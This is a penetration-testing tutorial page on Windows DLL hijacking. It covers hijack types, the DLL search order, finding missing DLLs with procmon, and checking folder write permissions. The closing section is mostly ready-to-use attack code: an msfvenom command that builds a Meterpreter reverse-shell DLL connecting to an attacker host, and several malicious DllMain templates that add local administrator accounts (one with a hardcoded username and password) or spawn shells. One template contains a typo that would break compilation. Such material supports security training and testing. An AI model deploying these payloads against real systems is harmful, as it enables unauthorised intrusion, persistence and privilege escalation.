# Dll Hijacking

## Definition

First of all, let’s get the definition out of the way. DLL hijacking is, in the broadest sense, **tricking a legitimate/trusted application into loading an arbitrary DLL**. Terms such as _DLL Search Order Hijacking_, _DLL Load Order Hijacking_, _DLL Spoofing_, _DLL Injection_ and _DLL Side-Loading_ are often -mistakenly- used to say the same.

Dll hijacking can be used to **execute** code, obtain **persistence** and **escalate privileges**. From those 3 the **least probable** to find is **privilege escalation** by far. However, as this is part of the privilege escalation section, I will focus on this option. Also, note that independently of the goal, a dll hijacking is perform the in the same way.

### Types

There is a **variety of approaches** to choose from, with success depending on how the application is configured to load its required DLLs. Possible approaches include:

1. **DLL replacement**: replace a legitimate DLL with an evil DLL. This can be combined with _DLL Proxying_ \[[2](https://kevinalmansa.github.io/application%20security/DLL-Proxying/)\], which ensures all functionality of the original DLL remains intact.
2. **DLL search order hijacking**: DLLs specified by an application without a path are searched for in fixed locations in a specific order \[[3](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)\]. Hijacking the search order takes place by putting the evil DLL in a location that is searched in before the actual DLL. This sometimes includes the working directory of the target application.
3. **Phantom DLL hijacking**: drop an evil DLL in place of a missing/non-existing DLL that a legitimate application tries to load \[[4](http://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/)\].
4. **DLL redirection**: change the location in which the DLL is searched for, e.g. by editing the `%PATH%` environment variable, or `.exe.manifest` / `.exe.local` files to include the folder containing the evil DLL \[[5](https://docs.microsoft.com/en-gb/windows/win32/sbscs/application-manifests), [6](https://docs.microsoft.com/en-gb/windows/win32/dlls/dynamic-link-library-redirection)\] .
5. **WinSxS DLL replacement**: replace the legitimate DLL with the evil DLL in the relevant WinSxS folder of the targeted DLL. Often referred to as DLL side-loading \[[7](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf)\].
6. **Relative path DLL Hijacking:** copy \(and optionally rename\) the legitimate application to a user-writeable folder, alongside the evil DLL. In the way this is used, it has similarities with \(Signed\) Binary Proxy Execution \[[8](https://attack.mitre.org/techniques/T1218/)\]. A variation of this is \(somewhat oxymoronically called\) ‘_bring your own LOLbin_’ \[[9](https://www.microsoft.com/security/blog/2019/09/26/bring-your-own-lolbin-multi-stage-fileless-nodersok-campaign-delivers-rare-node-js-based-malware/)\] in which the legitimate application is brought with the evil DLL \(rather than copied from the legitimate location on the victim’s machine\).

## Finding missing Dlls

The most common way to find missing Dlls inside a system is running [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) from sysinternals, **setting** the **following 2 filters**:

![](../../.gitbook/assets/image%20%28292%29.png)

![](../../.gitbook/assets/image%20%28147%29.png)

and just show the **File System Activity**:

![](../../.gitbook/assets/image%20%2896%29.png)

If you are looking for **missing dlls in general** you **leave** this running for some **seconds**.  
If you are looking for a **missing dll inside an specific executable** you should set **another filter like "Process Name" "contains" "&lt;exec name&gt;", execute it, and stop capturing events**.

## Exploiting Missing Dlls

In order to escalate privileges, the best chance we have is to be able to **write a dll that a privilege process will try to load** in some of **place where it is going to be searched**. Therefore, we will be able to **write** a dll in a **folder** where the **dll is searched before** the folder where the **original dll** is \(weird case\), or we will be able to **write on some folder where the dll is going to be searched** and the original **dll doesn't exist** on any folder.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

In general, a **Windows application** will use **pre-defined search paths to find DLL's** and it will check these paths in a specific order. DLL hijacking usually happens by placing a malicious DLL in one of these folders while making sure that DLL is found before the legitimate one. This problem can be mitigated by having the application specify absolute paths to the DLL's that it needs.

You can see the **DLL search order on 32-bit** systems below:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.\(_C:\Windows\System32_\)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. \(_C:\Windows\System_\)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory. 
   1. \(_C:\Windows_\)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

That is the **default** search order with **SafeDllSearchMode** enabled. When it's disabled the current directory escalates to second place. To disable this feature, create the **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\**SafeDllSearchMode** registry value and set it to 0 \(default is enabled\).

If [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function is called with **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** the search begins in the directory of the executable module that **LoadLibraryEx** is loading.

Finally, note that **a dll could be loaded indicating the absolute path instead just the name**. In that case that dll is **only going to be searched in that path** \(if the dll has any dependencies, they are going to be searched as just loaded by name\).

There are other ways to alter the ways to alter the search order but I'm not going to explain them here.

#### Exceptions on dll search order from Windows docs

* If a **DLL with the same module name is already loaded in memory**, the system checks only for redirection and a manifest before resolving to the loaded DLL, no matter which directory it is in. **The system does not search for the DLL**.
* If the DLL is on the list of **known DLLs** for the version of Windows on which the application is running, the **system uses its copy of the known DLL** \(and the known DLL's dependent DLLs, if any\) **instead of searching** for the DLL. For a list of known DLLs on the current system, see the following registry key: **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**.
* If a **DLL has dependencies**, the system **searches** for the dependent DLLs as if they were loaded with just their **module names**. This is true **even if the first DLL was loaded by specifying a full path**.

### Escalating Privileges

**Requisites**:

* **Find a process** that runs/will run as with **other privileges** \(horizontal/lateral movement\) that is **missing a dll.**
* Have **write permission** on any **folder** where the **dll** is going to be **searched** \(probably the executable directory or some folder inside the system path\).

Yeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** \(you can't by default\). But, in misconfigured environments this is possible.  
In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use \(probably just changing the path of the folder where you have write permissions\).

Note that you can **check your permissions in a folder** doing:

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

And **check permissions of all folders inside PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

You can also check the imports of an executable and the exports of a dll with:

```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.  
Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

In case you find an exploitable scenario one of the most important things to successfully exploit it would be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **\(bypassing UAC\)**](../authentication-credentials-uac-and-efs.md#uac) or from[ **High Integrity to SYSTEM**](./#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**  
Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Meterpreter**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

### Your own

Note that in several cases the Dll that you compile must **export several functions** that are going to be loaded by the victim process, if these functions doesn't exist the **binary won't be able to load** them and the **exploit will fail**.

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

